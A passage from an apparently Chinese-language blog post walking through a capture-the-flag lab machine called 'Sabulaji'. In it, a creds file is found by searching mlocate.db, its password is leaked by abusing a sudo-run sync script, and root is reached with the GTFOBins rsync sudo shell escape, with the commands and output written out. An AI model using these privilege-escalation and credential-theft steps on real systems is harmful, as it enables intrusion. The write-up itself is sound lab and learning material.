+welcome@Sabulaji:/tmp$ ls -l /var/lib/mlocate/mlocate.db
+-rw-r----- 1 root mlocate 1240438 Jun 14 00:22 /var/lib/mlocate/mlocate.db</pre></div>
+<p>​      在<code class="notranslate">var/lib/mlocate/</code>目录发现数据库文件 <code class="notranslate">mlocate.db</code>。<code class="notranslate">mlocate.db</code> 由 <code class="notranslate">updatedb</code> 命令生成，包含系统中所有文件的路径信息（如文件名、目录结构）。用户执行 <code class="notranslate">locate</code> 命令时，直接查询此数据库而非扫描磁盘，速度远超 <code class="notranslate">find</code> 等实时扫描工具</p>
+<p>​	看一下<code class="notranslate">locate </code>命令，有<code class="notranslate"> SGID</code> 权限<br>
+<code class="notranslate">SGID </code>作用：当普通用户执行 <code class="notranslate">locate</code>时，进程会临时以<code class="notranslate"> mlocate</code> 组身份运行（而非用户原属组），从而只读访问数据库</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/tmp$ ls -l /usr/bin/locate
+lrwxrwxrwx 1 root root 24 May 15 11:45 /usr/bin/locate -<span class="pl-k">&gt;</span> /etc/alternatives/locate
+ls -l /usr/bin/mlocate
+welcome@Sabulaji:/tmp$ ls -l /usr/bin/mlocate
+-rwxr-sr-x 1 root mlocate 43240 Dec  2  2020 /usr/bin/mlocate  <span class="pl-c"><span class="pl-c">#</span> SGID 位（r-s 中的 's'）</span>
+权限继承：因 mlocate 组对数据库有读权限（r--），用户通过命令间接获得访问权。
+</pre></div>
+<p>尝试定位一下 <code class="notranslate">/opt/sync.sh</code>脚本的禁止字符相关的文件：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/tmp$ locate <span class="pl-k">*</span>sabulaji<span class="pl-k">*</span>
+/home/sabulaji
+/home/sabulaji/.bash_history
+/home/sabulaji/.bash_logout
+/home/sabulaji/.bashrc
+/home/sabulaji/.profile
+/home/sabulaji/personal
+welcome@Sabulaji:/tmp$ cat /var/lib/mlocate/mlocate.db <span class="pl-k">|</span> grep abulaji
+Binary file (standard input) matches
+welcome@Sabulaji:/tmp$ hexdump -C /var/lib/mlocate/mlocate.db <span class="pl-k">|</span> grep -i sabulaji
+00008cb0  00 2f 68 6f 6d 65 2f 73  61 62 75 6c 61 6a 69 00  <span class="pl-k">|</span>./home/sabulaji.<span class="pl-k">|</span>
+00008d10  2f 73 61 62 75 6c 61 6a  69 2f 70 65 72 73 6f 6e  <span class="pl-k">|</span>/sabulaji/person<span class="pl-k">|</span>
+welcome@Sabulaji:/tmp$ strings /var/lib/mlocate/mlocate.db <span class="pl-k">|</span> grep -i sabulaji
+sabulaji
+/home/sabulaji
+/home/sabulaji/personal
+welcome@Sabulaji:/tmp$ xxd /var/lib/mlocate/mlocate.db <span class="pl-k">|</span> grep -i sabulaji -A 5
+00008cb0: 002f 686f 6d65 2f73 6162 756c 616a 6900  ./home/sabulaji.
+00008cc0: 002e 6261 7368 5f68 6973 746f 7279 0000  ..bash_history..
+00008cd0: 2e62 6173 685f 6c6f 676f 7574 0000 2e62  .bash_logout...b
+00008ce0: 6173 6872 6300 002e 7072 6f66 696c 6500  ashrc...profile.
+00008cf0: 0170 6572 736f 6e61 6c00 0200 0000 0068  .personal......h
+00008d00: 26ce 352d 89b7 0000 0000 002f 686f 6d65  <span class="pl-k">&amp;</span>.5-......./home
+00008d10: 2f73 6162 756c 616a 692f 7065 7273 6f6e  /sabulaji/person
+00008d20: 616c 0000 6372 6564 732e 7478 7400 006e  al..creds.txt..n
+00008d30: 6f74 6573 2e74 7874 0002 0000 0000 6826  otes.txt......h<span class="pl-k">&amp;</span>
+00008d40: cb6a 12d5 c700 0000 0000 2f68 6f6d 652f  .j......../home/
+00008d50: 7765 6c63 6f6d 6500 002e 6261 7368 5f68  welcome...bash_h
+00008d60: 6973 746f 7279 0000 2e62 6173 685f 6c6f  istory...bash_lo</pre></div>
+<p>目录<code class="notranslate">/home/sabulaji/personal</code>下发现 <code class="notranslate">creds.txt</code> 文件，读取内容（只显示差异，所以前后读不通文件）</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /tmp/a/personal/creds.txt
+Difference: 0a1
+<span class="pl-k">&gt;</span> Sensitive Credentials:Z2FzcGFyaW4=
+[+] Updated.
+welcome@Sabulaji:/tmp$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Z2FzcGFyaW4=<span class="pl-pds">"</span></span> <span class="pl-k">|</span> base64 -d
+gasparinwelcome@Sabulaji:/tmp$ 
+<span class="pl-c"><span class="pl-c">#</span>不用软连接也可以清空后用通配符</span>
+welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /dev/null
+Difference: 1d0
+<span class="pl-k">&lt;</span> Sensitive Credentials:Z2FzcGFyaW4=
+[+] Updated.
+welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabula<span class="pl-k">*</span>/personal/creds.txt
+Difference: 0a1
+<span class="pl-k">&gt;</span> Sensitive Credentials:Z2FzcGFyaW4=
+[+] Updated.</pre></div>
+<p>获得关键信息 <code class="notranslate">Z2FzcGFyaW4=</code>,别<code class="notranslate">base64</code>解码了，经测试这个就是<code class="notranslate">sabulaji</code>的密码</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/home$ su - sabulaji
+Password: <span class="pl-c"><span class="pl-c">#</span>Z2FzcGFyaW4=</span>
+sabulaji@Sabulaji:<span class="pl-k">~</span>$ ls
+personal
+sabulaji@Sabulaji:<span class="pl-k">~</span>$ id
+uid=1001(sabulaji) gid=1001(sabulaji) groups=1001(sabulaji)</pre></div>
+<p>获得<code class="notranslate">sabulaji</code>的账号密码信息为<code class="notranslate">sabulaji:Z2FzcGFyaW4=</code></p>
+<h3>5.获得root</h3>
+<p><code class="notranslate">sudo</code>发现所有用户能够以 <code class="notranslate">root </code>身份运行 <code class="notranslate">/usr/bin/rsync</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sabulaji@Sabulaji:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> sabulaji on Sabulaji:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+User sabulaji may run the following commands on Sabulaji:
+    (ALL) NOPASSWD: /usr/bin/rsync</pre></div>
+<p>[<a href="https://gtfobins.github.io/" rel="nofollow">查阅</a>](<a href="https://gtfobins.github.io/)%60" rel="nofollow">https://gtfobins.github.io/)`</a> GTFObins<code class="notranslate">，有现成的 </code>rsync` 提权方案</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>sudo rsync -e 'sh -c "sh 0&lt;&amp;2 1&gt;&amp;2"' 127.0.0.1:/dev/null</span>
+sabulaji@Sabulaji:<span class="pl-k">~</span>$ sudo rsync -e <span class="pl-s"><span class="pl-pds">'</span>sh -c "sh 0&lt;&amp;2 1&gt;&amp;2"<span class="pl-pds">'</span></span> 127.0.0.1:/dev/null
+<span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+<h5>拿到<code class="notranslate">root.txt</code></h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root)
+<span class="pl-c"><span class="pl-c">#</span> cd</span>
+<span class="pl-c"><span class="pl-c">#</span> ls</span>
+root.txt
+<span class="pl-c"><span class="pl-c">#</span> cat root.txt</span>
+</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://pingsag3.github.io">Pingsag3 Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","pingsag3/pingsag3.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
